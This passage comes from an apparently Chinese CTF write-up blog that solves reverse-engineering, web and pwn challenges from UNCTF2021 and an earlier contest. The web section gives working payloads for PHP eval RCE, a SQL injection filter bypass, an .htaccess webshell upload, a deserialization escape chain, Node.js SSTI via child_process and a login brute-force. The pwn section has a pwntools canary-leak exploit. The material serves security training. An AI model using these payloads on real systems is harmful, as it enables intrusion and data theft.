&amp;&amp; str5.toString().compareTo(&quot;871019511949491089510249103104116951164895101110100951164895101110100959997122121&quot;) == 0) &#123; System.out.println(&quot;Your keyword is correct!&quot;); &#125; else &#123; System.out.println(&quot;Your keyword is wrong!&quot;); &#125; &#125;&#125; flag经 ttk() 函数处理后与 Jr_j11y_s1tug_g0_raq_g0_raq_pnml 相同，逆 ttk() 替换函数： 1234567891011121314151617s = &#x27;Jr_j11y_s1tug_g0_raq_g0_raq_pnml&#x27;t = &#x27;&#x27;for k in s: if ord(k)-13 &gt;= ord(&#x27;a&#x27;) and ord(k)-13 &lt;= ord(&#x27;m&#x27;): t += chr(ord(k)-13) elif ord(k)-13 &gt;= ord(&#x27;A&#x27;) and ord(k)-13 &lt;= ord(&#x27;M&#x27;): t += chr(ord(k)-13) elif ord(k)+13 &gt;= ord(&#x27;n&#x27;) and ord(k)+13 &lt;= ord(&#x27;z&#x27;): t += chr(ord(k)+13) elif ord(k)+13 &gt;= ord(&#x27;N&#x27;) and ord(k)+13 &lt;= ord(&#x27;Z&#x27;): t += chr(ord(k)+13) else: t += kprint(t)# We_w11l_f1ght_t0_end_t0_end_cazy flag：flag&#123;We_w11l_f1ght_t0_end_t0_end_cazy&#125; ​ cute_doge 普通的柴犬，戳一戳会发生什么奇妙的事情呢？ 将exe用16进制工具查看，根据运行提示文字找到附近存在 ZmxhZ3tDaDFuYV95eWRzX2Nhenl9，base64解码得flag：flag&#123;Ch1na_yyds_cazy&#125;。 ​ hello_py 初次见面，送个python题，祝您接下来解题顺利，flag{input} uncompyle6反编译pyc文件得源码： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051import threading, timedef encode_1(n): global num while True: if num &gt;= 0: flag[num] = flag[num] ^ num num -= 1 time.sleep(1) if num &lt;= 0: breakdef encode_2(n): global num while True: if num &gt;= 0: flag[num] = flag[num] ^ flag[(num + 1)] num -= 1 time.sleep(1) if num &lt; 0: breakwhile True: Happy = [ 44, 100, 3, 50, 106, 90, 5, 102, 10, 112] num = 9 f = input(&#x27;Please input your flag:&#x27;) if len(f) != 10: print(&#x27;Your input is illegal&#x27;) else: flag = list(f) j = 0 for i in flag: flag[j] = ord(i) j += 1 else: print(&quot;flag to &#x27;ord&#x27;:&quot;, flag) t1 = threading.Thread(target=encode_1, args=(1, )) t2 = threading.Thread(target=encode_2, args=(2, )) t1.start() time.sleep(0.5) t2.start() t1.join() t2.join() if flag == Happy: print(&#x27;Good job!&#x27;) else: print(&#x27;No no no!&#x27;) 用z3求解： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748import threading, timefrom z3 import *f = [BitVec(f&#x27;flag&#123;i&#125;&#x27;,8) for i in range(10)]flag = f[:]x = Solver()def encode_1(n): global num while True: if num &gt;= 0: flag[num] = flag[num] ^ num num -= 1 time.sleep(1) if num &lt;= 0: breakdef encode_2(n): global num while True: if num &gt;= 0: flag[num] = flag[num] ^ flag[(num + 1)] num -= 1 time.sleep(1) if num &lt; 0: breakwhile True: Happy = [44, 100, 3, 50, 106, 90, 5, 102, 10, 112] num = 9 j = 0 t1 = threading.Thread(target=encode_1, args=(1, )) t2 = threading.Thread(target=encode_2, args=(2, )) t1.start() time.sleep(0.5) t2.start() t1.join() t2.join() for k in range(10): x.add(flag[k]==Happy[k]) if x.check() == sat: m = x.model() print(&#x27;&#x27;.join([chr(m[f[i]].as_long()) for i in range(len(f))])) break # He110_cazy flag：flag&#123;He110_cazy&#125; ​ WEBRCE_No_Para 1234567891011&lt;?phpif(&#x27;;&#x27; === preg_replace(&#x27;/[^\\W]+\\((?R)?\\)/&#x27;, &#x27;&#x27;, $_GET[&#x27;code&#x27;])) &#123; if(!preg_match(&#x27;/session|end|next|header|dir/i&#x27;,$_GET[&#x27;code&#x27;]))&#123; eval($_GET[&#x27;code&#x27;]); &#125;else&#123; die(&quot;Hacker!&quot;); &#125;&#125;else&#123; show_source(__FILE__);&#125;?&gt; 第一层正则表达式为递归匹配只含字母、数字、下划线的无参函数，如 a(b_c());，第二层要求不能包含 session|end|next|header|dir 关键字，使用 get_defined_vars() 可从请求中向 $_GET 传入所需执行的函数，由于 end 和 next 不能使用，可使用 reset 和 array_reverse 调整数组与取值，再利用 eval 命令执行。 payload：?code=eval(reset(array_reverse(current(get_defined_vars()))));&amp;b=system(&quot;cat%20flag.php&quot;);","categories":[{"name":"match","slug":"match","permalink":"https://lazzzaro.github.io/categories/match/"}],"tags":[{"name":"2022赛","slug":"2022赛","permalink":"https://lazzzaro.github.io/tags/2022%E8%B5%9B/"}],"author":"Lazzaro"},{"title":"UNCTF2021-公开赛","slug":"match-UNCTF2021公开赛","date":"2021-12-07T11:44:54.000Z","updated":"2021-12-07T16:08:16.383Z","comments":true,"path":"2021/12/07/match-UNCTF2021公开赛/","link":"","permalink":"https://lazzzaro.github.io/2021/12/07/match-UNCTF2021%E5%85%AC%E5%BC%80%E8%B5%9B/","excerpt":"","text":"​ 为响应国家选拔、推荐优秀网络空间安全专业人才，培养学生的创新意识与团队合作精神，提高大学生的网络安全技术水平、创新实践与综合设计能力，推动我国高校网络空间安全专业建设与改革，全国9所高校（闽南师范大学，福州大学至诚学院，重庆大学，陆军工程大学，南京航空航天大学，金陵科技学院，西华大学，浙江师范大学，厦门理工大学）决定组成联合招新赛，秉着公平，公正，公开的原则为本高校选拔网络空间安全专业人才。 竞赛时间 2021年11月28日-2021年12月6日 竞赛平台 自研平台，平台地址：https://ctf.unctf.com/ Rank: 1 # Webfuzz_md5 1234567891011121314151617181920&lt;?phperror_reporting(0);highlight_file(__FILE__);include(&quot;flag.php&quot;);$user=$_GET[&quot;user&quot;];$pass=$_POST[&quot;pass&quot;];$pass2=md5($pass);$pass3=substr($pass2, 0, 5);$a=preg_replace(&quot;/unctf/i&quot;,&quot;&quot;,$user);if($a===&quot;unctf&quot;)&#123; if($pass3===&quot;66666&quot;)&#123; echo $flag; &#125; else&#123; echo &quot;welcome to unctf~&quot;; &#125;&#125;else&#123; echo &quot;welcome to unctf~~&quot;;&#125; user 参数值双写绕过，pass 参数值爆破符合前5位是66666的MD5： 12345678from hashlib import md5for i in range(100000000): x = md5(str(i).encode()).hexdigest() if x.startswith(&#x27;66666&#x27;): print(i) break# 1004649 Payload：http://xxx/?user=ununctfctf，POST传参 pass=1004649。 flag：UNCTF&#123;13875534-9edb-4e2b-b51c-b18091ca1284&#125; ​ can_you_hacked_me 带黑阔，你能把我骇咯？ www.zip 得到源码。 index.php： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364&lt;html&gt;&lt;head&gt; &lt;meta charset=&quot;UTF-8&quot;&gt; &lt;title&gt;Can You Hacked me?&lt;/title&gt;&lt;/head&gt;&lt;body&gt;&lt;h1&gt;Can You Hacked me?&lt;/h1&gt;&lt;form method=&quot;get&quot;&gt; Username: &lt;input type=&quot;text&quot; name=&quot;username&quot;&gt; &lt;br&gt; Password: &lt;input type=&quot;text&quot; name=&quot;password&quot;&gt; &lt;br&gt; &lt;input type=&quot;submit&quot;&gt;&lt;/form&gt;&lt;pre&gt;&lt;?phpinclude &quot;flag.php&quot;;error_reporting(0);function waf1($inject) &#123; preg_match(&quot;/&#x27;|union|select|&amp;|\\||and|or|\\(|,/i&quot;,$inject) &amp;&amp; die(&#x27;return preg_match(&quot;/\\&#x27;|union|select|&amp;|\\\\||and|or|(|,/i&quot;,$inject);&#x27;);&#125;if(isset($_GET[&#x27;username&#x27;]) &amp;&amp; isset($_GET[&#x27;password&#x27;])) &#123; $username = $_GET[&#x27;username&#x27;]; $password = $_GET[&#x27;password&#x27;]; waf1($username) || waf1($password); if (strtolower($_GET[&#x27;username&#x27;]) == &#x27;admin&#x27; &amp;&amp; $_SERVER[&quot;REMOTE_ADDR&quot;] != &#x27;127.0.0.1&#x27;) &#123; die(&#x27;Admin only allow to login at localhost&#x27;); &#125; $conn = new mysqli(&quot;127.0.0.1&quot;,&quot;root&quot;,&quot;root&quot;,&quot;supersqli&quot;); $sql = &quot;select * from `users` where username = &#x27;$username&#x27; and password = &#x27;$password&#x27;;&quot;; $result = $conn-&gt;query($sql); echo $sql . &#x27;&lt;br&gt;&#x27;; if ($result-&gt;num_rows &gt; 0) &#123; // 输出数据 while($row = $result-&gt;fetch_assoc()) &#123; if($row[&quot;username&quot;] === &#x27;admin&#x27;) &#123; echo &#x27;Welcome Admin, here is your flag: &#x27; . $flag; &#125; else &#123; die(&quot;You are not Admin.&quot;); &#125; &#125; &#125; else &#123; echo &quot;Result Not Found!&quot;; &#125; $conn-&gt;close();&#125;?&gt;&lt;/pre&gt;&lt;/body&gt;&lt;/html&gt; db.sql： 123456789101112CREATE DATABASE IF NOT EXISTS supersqli;USE supersqli;CREATE TABLE IF NOT EXISTS `users` ( `id` int(10) NOT NULL, `username` varchar(20) NOT NULL, `password` varchar(20) NOT NULL) ENGINE=MyISAM DEFAULT CHARSET=utf8;INSERT INTO `users` values(1,&#x27;test&#x27;, &#x27;test&#x27;),(2,&#x27;admin&#x27;,&#x27;AdminSecret&#x27;); 禁用的关键字使得难以进行常规注入，考虑让where条件恒真，username 传入 \\ 转义后单引号，使 username 的值为 &#39; and password =，password 传入异或操作，使总条件恒真，再筛选出第二条数据即可让查询结果为 admin。 Payload： http://xxx/?username=\\&amp;password=^0 limit 2 offset 1 --+ flag：UNCTF&#123;3abc4508-17c4-488e-9b2b-3fa11fee771c&#125; ​ phpmysql 你了解flag吗?在根目录哦 123456789101112131415161718192021222324252627282930&lt;?phpshow_source(__FILE__);echo(&quot;欢迎来到unctf2021，have fun&quot;.&quot;&lt;br&gt;&quot;);$db_host=$_POST[&#x27;host&#x27;];$db_user=$_POST[&#x27;user&#x27;];$db_pwd=$_POST[&#x27;pwd&#x27;];$db_port=$_POST[&#x27;port&#x27;];if($db_host==&quot;&quot;)&#123; die(&quot;数据库地址不能为空！&quot;);&#125;if(is_numeric($db_host))&#123; echo(&quot;fakeflag is /flag&quot;.&quot;&lt;br&gt;&quot;); if(preg_match(&quot;/;|\\||&amp;/is&quot;,$db_user) || preg_match(&quot;/;|\\||&amp;/is&quot;,$db_pwd) || preg_match(&quot;/;|\\||&amp;/is&quot;,$db_port))&#123; die(&quot;嘉然今天吃什么&quot;); &#125; system(&quot;mysql -h $db_host -u $db_user -p $db_pwd -P $db_port --enable-local-infile&quot;);&#125;else&#123; echo(&quot;Maybe you can do someting else&quot;.&quot;&lt;br&gt;&quot;); if(!isset($db_user) || !isset($db_pwd))&#123; eval(&quot;echo new Exception(\\&quot;&lt;script&gt;alert(&#x27;关注嘉然，顿顿解馋！！！&#x27;);&lt;/script&gt;\\&quot;);&quot;); &#125; else&#123; $db_user = str_ireplace(&quot;SplFileObject&quot;, &quot;UNCTF2021&quot;, $db_user); eval(&quot;echo new $db_user($db_pwd);&quot;); &#125;&#125; 利用最后 eval(&quot;echo new $db_user($db_pwd);&quot;); 的拼接特性，用类 DirectoryIterator 列目录后，再RCE。 Payload： POST传参 host=x&amp;pwd=y&amp;port=z&amp;user=DirectoryIterator(&quot;glob:///*&quot;);system(&quot;cat /fllllaaaaag&quot;);// ​ babywrite 12345678910111213141516171819&lt;?phphighlight_file(__FILE__);$sandbox = md5($_SERVER[&#x27;REMOTE_ADDR&#x27;]);if (!is_dir($sandbox)) &#123; mkdir($sandbox);&#125;if (isset($_GET[&#x27;filename&#x27;]) &amp;&amp; isset($_GET[&#x27;content&#x27;])) &#123; $filename = $_GET[&#x27;filename&#x27;]; $content = $_GET[&#x27;content&#x27;]; if (preg_match_all(&quot;/ph|\\.\\.|\\//i&quot;, $filename) || strlen($filename) &gt; 10) &#123; die(&quot;No way!&quot;); &#125; if (preg_match_all(&quot;/&lt;\\?|ph/&quot;, $content)) &#123; die(&quot;No way!&quot;); &#125; $filename = $sandbox . &quot;/&quot; . $filename; @file_put_contents($filename, $content); echo $filename;&#125; 传入文件名和内容写文件，禁用的关键字禁掉了伪协议、目录穿越、常规PHP头和写PHP文件。 由于sandbox内无现成PHP文件，考虑写 .htaccess 文件将普通文件以PHP文件解析。 文件内无法写入PHP代码，可以先写入base64编码字符串后，再利用 .htaccess 文件伪协议解析即可， .htaccess 文件中的用到的 php 关键字用 \\ 换行绕过。 .htaccess 文件内容： 12345AddType application/x-httpd-p\\hp .jpgp\\hp_value auto_append_file &quot;p\\hp://filter/convert.base64-decode/resource=1.jpg&quot; Payload： http://xxx/?filename=.htaccess&amp;content=AddType%20application/x-httpd-p\\%0ahp%20.jpg%0ap\\%0ahp_value%20auto_append_file%20&quot;p\\%0ahp://filter/convert.base64-decode/resource=1.jpg&quot; http://xxx/?filename=1.jpg&amp;content=PD9waHAgc3lzdGVtKCJjYXQgL2ZsYWciKTs%2FPg%3D%3D 最后访问 1.jpg 得到flag。 ​ easy_serialize 12345678910111213141516171819202122232425262728293031&lt;?phpinclude &quot;function.php&quot;;$action = @$_POST[&#x27;action&#x27;];$name = $_POST[&#x27;name&#x27;];$pass = $_POST[&#x27;pass&#x27;];$email = $_POST[&#x27;email&#x27;];function filter($file)&#123; $filter_arr = array(&#x27;flag&#x27;,&#x27;php&#x27;,&#x27;fl1g&#x27;); $filter = &#x27;/&#x27;.implode(&#x27;|&#x27;,$filter_arr).&#x27;/i&#x27;; return preg_replace($filter,&#x27;&#x27;,$file);&#125;$a= $_GET[&#x27;a&#x27;];$b = $_GET[&#x27;b&#x27;];$u = new UNCTF($pass,$email,$name);$s = serialize($u);switch($action)&#123; case 1: highlight_file(&#x27;function.php&#x27;); break; default: highlight_file(&#x27;index.php&#x27;);&#125;if(md5($a) == md5($b) &amp;&amp; $a !=$b)&#123; unserialize(filter($s));&#125; POST传入 action=1，得到 function.php 源码： 1234567891011121314151617181920212223242526272829303132333435363738&lt;?phpclass me7eorite&#123; //test public $safe; public $class; public function __construct() &#123; $this-&gt;safe = &quot;/etc/passwd&quot;; $this-&gt;class=new UNCTF(&#x27;me7eorite&#x27;,&#x27;me7eorite@qq.com&#x27;,&#x27;me7eorite&#x27;); &#125; public function __toString() &#123; $this-&gt;class-&gt;getShell(); return &#x27;&#x27;; &#125; public function getShell()&#123; readfile($this-&gt;safe); &#125;&#125;class UNCTF&#123; public $pass; public $email; public $name; public function __construct($pass,$email,$name) &#123; $this-&gt;pass = $pass; $this-&gt;name = $name; $this-&gt;email = $email; &#125; public function getShell()&#123; echo &#x27;flag&#123;this_is_fake&#125;&#x27;; &#125; public function __destruct() &#123; echo $this-&gt;name . &#x27;Welcome to UNCTF 2021!&#x27;; &#125;&#125; 第一层，PHP弱比较特性，数组绕过，传入 ?a[]=1&amp;b[]=2； 第二层，PHP序列化+反序列化，filter() 删除三种关键字，明显的减字符型反序列化逃逸。 本地测试，先正常POST传值 name=z&amp;pass=x&amp;email=y，得到序列化字符串： O:5:&quot;UNCTF&quot;:3:&#123;s:4:&quot;pass&quot;;s:3:&quot;x&quot;;s:5:&quot;email&quot;;s:3:&quot;y&quot;;s:4:&quot;name&quot;;s:3:&quot;z&quot;;&#125;。 观察利用链：类UNCTF 的 __destruct() 中，控制 $this-&gt;name 可以触发类 me7eorite 的 __toString()，控制 $this-&gt;class 为新的 me7eorite 对象，避免调用类 UNCTF 的 getShell()，而调用类 me7eorite 的 getShell()，再控制 $this-&gt;safe 可任意读。 1234567891011121314&lt;?php...$y = new me7eorite;$x = new me7eorite;$x-&gt;safe = &#x27;/etc/passwd&#x27;;$x-&gt;class = $y;$name = $x;$pass = &#x27;x&#x27;;$email = &#x27;y&#x27;;$u = new UNCTF($pass,$email,$name);$s = serialize($u);echo $s;// O:5:&quot;UNCTF&quot;:3:&#123;s:4:&quot;pass&quot;;s:1:&quot;x&quot;;s:5:&quot;email&quot;;s:1:&quot;y&quot;;s:4:&quot;name&quot;;O:9:&quot;me7eorite&quot;:2:&#123;s:4:&quot;safe&quot;;s:11:&quot;/etc/passwd&quot;;s:5:&quot;class&quot;;O:9:&quot;me7eorite&quot;:2:&#123;s:4:&quot;safe&quot;;s:11:&quot;/etc/passwd&quot;;s:5:&quot;class&quot;;O:5:&quot;UNCTF&quot;:3:&#123;s:4:&quot;pass&quot;;s:9:&quot;me7eorite&quot;;s:5:&quot;email&quot;;s:16:&quot;me7eorite@qq.com&quot;;s:4:&quot;name&quot;;s:9:&quot;me7eorite&quot;;&#125;&#125;&#125;&#125; 由于能POST传入的只有序列化部分的类 UNCTF 参数，可以通过给 name 传入恶意序列化字符串，serialize() 后截断正常的序列化字符串；给email 传入过滤关键字，filter() 之后使原有长度值与需去除的正常字符串长度相等，保留恶意序列化字符串，最后经 unserialize() 控制反序列化过程完成利用链。 尝试传值： 12345678910&lt;?php...$name = &#x27;z&quot;;s:4:&quot;name&quot;;O:9:&quot;me7eorite&quot;:2:&#123;s:4:&quot;safe&quot;;s:11:&quot;/etc/passwd&quot;;s:5:&quot;class&quot;;O:9:&quot;me7eorite&quot;:2:&#123;s:4:&quot;safe&quot;;s:11:&quot;/etc/passwd&quot;;s:5:&quot;class&quot;;O:5:&quot;UNCTF&quot;:3:&#123;s:4:&quot;pass&quot;;s:9:&quot;me7eorite&quot;;s:5:&quot;email&quot;;s:16:&quot;me7eorite@qq.com&quot;;s:4:&quot;name&quot;;s:9:&quot;me7eorite&quot;;&#125;&#125;&#125;&#125;&#x27;;$pass = &#x27;x&#x27;;$email = &#x27;phpphp&#x27;;$u = new UNCTF($pass,$email,$name);$s = serialize($u);echo $s;// O:5:&quot;UNCTF&quot;:3:&#123;s:4:&quot;pass&quot;;s:1:&quot;x&quot;;s:5:&quot;email&quot;;s:6:&quot;phpphp&quot;;s:4:&quot;name&quot;;s:245:&quot;z&quot;;s:4:&quot;name&quot;;O:9:&quot;me7eorite&quot;:2:&#123;s:4:&quot;safe&quot;;s:11:&quot;/etc/passwd&quot;;s:5:&quot;class&quot;;O:9:&quot;me7eorite&quot;:2:&#123;s:4:&quot;safe&quot;;s:11:&quot;/etc/passwd&quot;;s:5:&quot;class&quot;;O:5:&quot;UNCTF&quot;:3:&#123;s:4:&quot;pass&quot;;s:9:&quot;me7eorite&quot;;s:5:&quot;email&quot;;s:16:&quot;me7eorite@qq.com&quot;;s:4:&quot;name&quot;;s:9:&quot;me7eorite&quot;;&#125;&#125;&#125;&#125;【&quot;;&#125;z&quot;;s:4:&quot;name&quot;;O:9:&quot;me7eorite&quot;:2:&#123;s:4:&quot;safe&quot;;s:11:&quot;/etc/passwd&quot;;s:5:&quot;class&quot;;O:9:&quot;me7eorite&quot;:2:&#123;s:4:&quot;safe&quot;;s:11:&quot;/etc/passwd&quot;;s:5:&quot;class&quot;;O:5:&quot;UNCTF&quot;:3:&#123;s:4:&quot;pass&quot;;s:9:&quot;me7eorite&quot;;s:5:&quot;email&quot;;s:16:&quot;me7eorite@qq.com&quot;;s:4:&quot;name&quot;;s:9:&quot;me7eorite&quot;;&#125;&#125;&#125;&#125;】截断 计算需去除的正常字符串 &quot;;s:4:&quot;name&quot;;s:245:&quot;z 长度为21，则使得原有长度值与需去除的正常字符串长度相等，则需要 21/len(&#39;php&#39;)=21/3=7 个 php ，再将 /etc/passwd 换成 /flag： 12345678910&lt;?php...$name = &#x27;z&quot;;s:4:&quot;name&quot;;O:9:&quot;me7eorite&quot;:2:&#123;s:4:&quot;safe&quot;;s:5:&quot;/flag&quot;;s:5:&quot;class&quot;;O:9:&quot;me7eorite&quot;:2:&#123;s:4:&quot;safe&quot;;s:5:&quot;/flag&quot;;s:5:&quot;class&quot;;O:5:&quot;UNCTF&quot;:3:&#123;s:4:&quot;pass&quot;;s:9:&quot;me7eorite&quot;;s:5:&quot;email&quot;;s:16:&quot;me7eorite@qq.com&quot;;s:4:&quot;name&quot;;s:9:&quot;me7eorite&quot;;&#125;&#125;&#125;&#125;&#x27;;$pass = &#x27;x&#x27;;$email = &#x27;phpphpphpphpphpphpphp&#x27;;$u = new UNCTF($pass,$email,$name);$s = serialize($u);echo $s;// O:5:&quot;UNCTF&quot;:3:&#123;s:4:&quot;pass&quot;;s:1:&quot;x&quot;;s:5:&quot;email&quot;;s:21:&quot;phpphpphpphpphpphpphp&quot;;s:4:&quot;name&quot;;s:231:&quot;z&quot;;s:4:&quot;name&quot;;O:9:&quot;me7eorite&quot;:2:&#123;s:4:&quot;safe&quot;;s:5:&quot;/flag&quot;;s:5:&quot;class&quot;;O:9:&quot;me7eorite&quot;:2:&#123;s:4:&quot;safe&quot;;s:5:&quot;/flag&quot;;s:5:&quot;class&quot;;O:5:&quot;UNCTF&quot;:3:&#123;s:4:&quot;pass&quot;;s:9:&quot;me7eorite&quot;;s:5:&quot;email&quot;;s:16:&quot;me7eorite@qq.com&quot;;s:4:&quot;name&quot;;s:9:&quot;me7eorite&quot;;&#125;&#125;&#125;&#125;【&quot;;&#125;z&quot;;s:4:&quot;name&quot;;O:9:&quot;me7eorite&quot;:2:&#123;s:4:&quot;safe&quot;;s:5:&quot;/flag&quot;;s:5:&quot;class&quot;;O:9:&quot;me7eorite&quot;:2:&#123;s:4:&quot;safe&quot;;s:5:&quot;/flag&quot;;s:5:&quot;class&quot;;O:5:&quot;UNCTF&quot;:3:&#123;s:4:&quot;pass&quot;;s:9:&quot;me7eorite&quot;;s:5:&quot;email&quot;;s:16:&quot;me7eorite@qq.com&quot;;s:4:&quot;name&quot;;s:9:&quot;me7eorite&quot;;&#125;&#125;&#125;&#125;】截断 注意 flag 也被过滤，双写绕过即可。 Payload： http://xxx?a[]=1&amp;b[]=2，POST传参 name=z&quot;;s:4:&quot;name&quot;;O:9:&quot;me7eorite&quot;:2:&#123;s:4:&quot;safe&quot;;s:5:&quot;/flflagag&quot;;s:5:&quot;class&quot;;O:9:&quot;me7eorite&quot;:2:&#123;s:4:&quot;safe&quot;;s:5:&quot;/flflagag&quot;;s:5:&quot;class&quot;;O:5:&quot;UNCTF&quot;:3:&#123;s:4:&quot;pass&quot;;s:9:&quot;me7eorite&quot;;s:5:&quot;email&quot;;s:16:&quot;me7eorite@qq.com&quot;;s:4:&quot;name&quot;;s:9:&quot;me7eorite&quot;;&#125;&#125;&#125;&#125;&amp;pass=x&amp;email=phpphpphpphpphpphpphp flag：UNCTF&#123;bc9b3f89-bed6-4bc3-a211-b9eed8612af7&#125; ​ nodejs_ssti一个输入框和提交按钮，尝试SSTI输入 &#123;&#123;2*3&#125;&#125; ，发现利用点在title值。 尝试 &#123;&#123;print(xx)&#125;&#125; 出现报错： 1234567891011TypeError: getValue(...) is not a function at sodaExp (eval at getEvalFunc (/app/node_modules/sodajs/dist/soda.js:266:28), &lt;anonymous&gt;:1:63) at Soda.parseSodaExpression (/app/node_modules/sodajs/dist/soda.js:403:42) at /app/node_modules/sodajs/dist/soda.js:188:44 at String.replace (&lt;anonymous&gt;) at compile (/app/node_modules/sodajs/dist/soda.js:187:53) at /app/node_modules/sodajs/dist/soda.js:257:21 at Array.map (&lt;anonymous&gt;) at compile (/app/node_modules/sodajs/dist/soda.js:256:55) at Soda.compileNode (/app/node_modules/sodajs/dist/soda.js:261:13) at /app/node_modules/sodajs/dist/soda.js:130:23 说明代码使用的是soda.js，实际是node.js注入，利用node.js特性使用 child_process 调用 execSync() 方法RCE。 Payload： http://xxx/who POST传参 name=&#123;&#123;\" \".toString.constructor(\"return global.process.mainModule.constructor._load('child_process').execSync('cat /flag').toString()\")()&#125;&#125;&amp;brand=web flag：UNCTF&#123;45d9452b-630a-4ffa-b963-f0da57cf0e79&#125; ​ encrypt_login 听说你很擅长撞库？ 随便输入用户名密码，返回提示密码为纯数字： I can tell you my name is admin and my password is made by number only. This time, you can not to buster my password :) 查看源码发现前端加密js文件 encrypto.js，代码已混淆，根据 jsjiami.com.v6 字样，使用 JSDec 在线解混淆有： 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950/* *Progcessed By JSDec in 0.01s *JSDec - JSDec.js.org */$(&#x27;#submit&#x27;)[&#x27;click&#x27;](function() &#123; var _0x326c0f = &#123; &#x27;DTeqY&#x27;: function(_0x1553aa, _0x4bb167) &#123; return _0x1553aa == _0x4bb167; &#125;, &#x27;IeKGb&#x27;: function(_0x2ec083, _0x47b18b, _0x120b6a) &#123; return _0x2ec083(_0x47b18b, _0x120b6a); &#125;, &#x27;foePj&#x27;: &#x27;-----BEGIN PUBLIC KEY-----\\nMIGfMA0GCSqGSIb3DQEBAQUAA4GNADCBiQKBgQD6US5bbJ7JrsKYeSa8goPJQBgU\\nWXdNyUxtPfcwuCrsYEcWNdnk1fpIdSfUvrku39fYl+h1ciyanp5H79uSzuqsUrPE\\nHzb2y+GTqdmNzZ53JPcxrFlYMv3NX0EOk3qMzgcSV/qXcAc+fWxLSTV5OVeWV8Lr\\nKJVXPMuQVgrw/SxkBQIDAQAB\\n-----END PUBLIC KEY-----&#x27;, &#x27;iaWKq&#x27;: function(_0x1c6939, _0x219dc9) &#123; return _0x1c6939 + _0x219dc9; &#125;, &#x27;PUpKG&#x27;: function(_0x213ed6, _0xe318d3) &#123; return _0x213ed6 + _0xe318d3; &#125;, &#x27;JNTjF&#x27;: &#x27;#username&#x27;, &#x27;OSnwF&#x27;: function(_0xd115dc, _0x2bfff6) &#123; return _0xd115dc(_0x2bfff6); &#125;, &#x27;bZMhU&#x27;: &#x27;post&#x27;, &#x27;otSyR&#x27;: function(_0x486713, _0x17d2bc) &#123; return _0x486713 + _0x17d2bc; &#125; &#125;; var _0x5182d1 = new JSEncrypt(); let _0x20b0a1 = _0x326c0f[&#x27;foePj&#x27;]; _0x5182d1[&#x27;setPublicKey&#x27;](_0x20b0a1); var _0x4833f6 = _0x5182d1[&#x27;encrypt&#x27;](_0x326c0f[&#x27;iaWKq&#x27;](_0x326c0f[&#x27;PUpKG&#x27;]($(_0x326c0f[&#x27;JNTjF&#x27;])[&#x27;val&#x27;](), &#x27;|-|&#x27;), _0x326c0f[&#x27;OSnwF&#x27;]($, &#x27;#password&#x27;)[&#x27;val&#x27;]())); $[&#x27;ajax&#x27;](&#123; &#x27;url&#x27;: &#x27;login.php&#x27;, &#x27;type&#x27;: _0x326c0f[&#x27;bZMhU&#x27;], &#x27;data&#x27;: _0x326c0f[&#x27;otSyR&#x27;](&#x27;data=&#x27;, _0x4833f6), &#x27;success&#x27;: function(_0x1626c4) &#123; coco[&#x27;alert&#x27;](&#123; &#x27;title&#x27;: &#x27;鎻愮ず&#x27;, &#x27;text&#x27;: _0x1626c4 &#125;); if (_0x326c0f[&#x27;DTeqY&#x27;](_0x1626c4, &#x27;登录成功&#x27;)) &#123; _0x326c0f[&#x27;IeKGb&#x27;](setTimeout, function() &#123; location[&#x27;reload&#x27;](); &#125;, 0x3e8); &#125; &#125; &#125;);&#125;);;_0xod5 = &#x27;jsjiami.com.v6&#x27; 分析发现，前端输入的账号密码，以 username|-|password 的方式组合后，再经RSA加密得到base64密文。 生成爆破用字典： 123456789101112131415161718192021import base64from Crypto.Cipher import PKCS1_v1_5 as Cipher_pkcs1_v1_5from Crypto.PublicKey import RSAfrom tqdm import tqdmf = open(&#x27;dict.txt&#x27;,&#x27;w&#x27;)public_key = &#x27;&#x27;&#x27;-----BEGIN PUBLIC KEY-----MIGfMA0GCSqGSIb3DQEBAQUAA4GNADCBiQKBgQD6US5bbJ7JrsKYeSa8goPJQBgUWXdNyUxtPfcwuCrsYEcWNdnk1fpIdSfUvrku39fYl+h1ciyanp5H79uSzuqsUrPEHzb2y+GTqdmNzZ53JPcxrFlYMv3NX0EOk3qMzgcSV/qXcAc+fWxLSTV5OVeWV8LrKJVXPMuQVgrw/SxkBQIDAQAB-----END PUBLIC KEY-----&#x27;&#x27;&#x27;for i in tqdm(range(10000)): password = str(i) m = &#x27;admin|-|&#x27; + password rsakey = RSA.importKey(public_key) cipher = Cipher_pkcs1_v1_5.new(rsakey) cipher_text = base64.b64encode(cipher.encrypt(m)) f.write(cipher_text+&#x27;\\n&#x27;) 最后上Burpsuite，加载新字典dict.txt，爆破拿到flag。 ​ # Pwnfo关键代码： 12345678910111213141516171819202122232425262728293031323334int __cdecl main(int argc, const char **argv, const char **envp)&#123; setvbuf(stdin, 0LL, 2, 0LL); setvbuf(stdout, 0LL, 2, 0LL); speaking(); leak(); return 0;&#125;int speaking()&#123; return puts( &quot;Do you know the format string?\\n&quot; &quot; you can message at here:\\n&quot; &quot; https://wiki.x10sec.org/pwn/linux/user-mode/fmtstr/fmtstr-intro/&quot;);&#125;unsigned __int64 leak()&#123; char s[88]; // [rsp+0h] [rbp-60h] BYREF unsigned __int64 v2; // [rsp+58h] [rbp-8h] v2 = __readfsqword(0x28u); puts( &quot;I heared that you are interested in the CTF.\\n&quot; &quot; I hope that you will hold on to keep your interest\\n&quot; &quot; tell me,will you?&quot;); fgets(s, 80, stdin); puts(&quot;I will remember what you said&quot;); printf(s); puts(&quot;wait for your good news...&quot;); gets(s); return __readfsqword(0x28u) ^ v2;&#125; checksec发现存在canary，利用leak() 中存在的格式化字符串漏洞泄露canary，再实现ret2text。 Payload： 1234567891011121314151617from pwn import *r=remote(&#x27;node2.hackingfor.fun&#x27;,38793)[r.recvline() for i in range(6)]r.sendline(&#x27;%17$p&#x27;)r.recvline()canary = int(r.recvline().strip()[2:],16)print(hex(canary))r.recvline()backdoor_addr = 0x40080Dpl = &#x27;a&#x27;*(0x60-8)+p64(canary)+&#x27;a&#x27;*8+p64(backdoor_addr)r.sendline(pl)print(r.recvall()) ​ sc关键代码： 123456789101112131415161718192021int __cdecl main(int argc, const char **argv, const char **envp)&#123; char buf[16]; // [rsp+0h] [rbp-10h] BYREF setvbuf(stdin, 0LL, 2, 0LL); setvbuf(stdout, 0LL, 2, 0LL); init(); puts(&quot;Do you know the ShellCode?&quot;); puts(&quot;\\n\\n\\n---------^-^----------&quot;); puts(&quot;show me your Migic&quot;); 